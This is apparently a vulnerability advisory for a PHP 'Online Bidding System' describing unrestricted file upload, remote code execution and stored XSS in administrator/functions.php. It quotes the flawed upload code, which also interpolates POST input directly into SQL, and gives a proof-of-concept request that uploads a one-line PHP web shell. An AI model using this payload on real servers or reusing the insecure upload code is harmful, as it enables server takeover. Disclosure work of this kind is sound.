## ONLINE BIDDING SYSTEM IN PHP WITH SOURCE CODE 

## supplier 

[Online Bidding System In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-bidding-system-in-php-with-source-code/)

### Product and Version Affected

- **Product Name:** Online Bidding System In PHP With Source Code
- **Affected File: **administrator/addcategory.php,administrator/functions.php

### **Vulnerability Type**

- **Unrestricted File Upload**
- **Arbitrary Code Execution**
- **Stored XSS**

### Detailed Description

The application does **not properly validate uploaded files**.
 In `functions.php`, the file upload logic only checks file size, **without validating file extension, MIME type, content**, or applying server-side filtering.

Because file names and file content are both not validated, an attacker can upload:

- `.php` **webshell**
- files containing injected HTML/JS (Stored XSS)
- overwrite existing files if there is no randomness

This leads to **remote code execution (RCE)** on the server.

### Affected Code Snippets

addcategory.php

```
<?php
	session_start();
	if($_SESSION['isvalid'] != "true"){
		header("location:index.php");
	}
	require('functions.php');
	require('htmls.php');
	headhtml();
	categoryadd();
?>
```

functions.php

```
function categoryadd(){
	if (isset($_POST['cmdadd'])) 
 	{
 	$name = $_FILES["catimage"] ["name"];
	$type = $_FILES["catimage"] ["type"];
	$size = $_FILES["catimage"] ["size"];
	$temp = $_FILES["catimage"] ["tmp_name"];
	$error = $_FILES["catimage"] ["error"];
	if ($error > 0){
		die("Error uploading file! Code $error.");
	}else{
		if($size > 1000000000) //conditions for the file
		{
			die("Format is not allowed or file size is too big!");
		}else{
			move_uploaded_file($temp,"images/category/".$name);
			echo "Upload Complete!";
		}
	} 			
	$categoryname = $_POST['categoryname'];
	mysql_query("INSERT INTO pcategories(categoryname, catimage) VALUES('$categoryname','$name')")or die(mysql_error());  
	echo " One record successfully added!";
	}
}
```

poc

```
POST /administrator/addcategory.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----123

------123
Content-Disposition: form-data; name="categoryname"

test
------123
Content-Disposition: form-data; name="catimage"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------123
Content-Disposition: form-data; name="cmdadd"

submit
------123--

```



### Impact

- No filtering on file extension

- No MIME type verification

- No re-generation of file name → can overwrite arbitrary files

- Upload directory is inside the webroot → files executable

- No sanitization → filename could contain XSS payload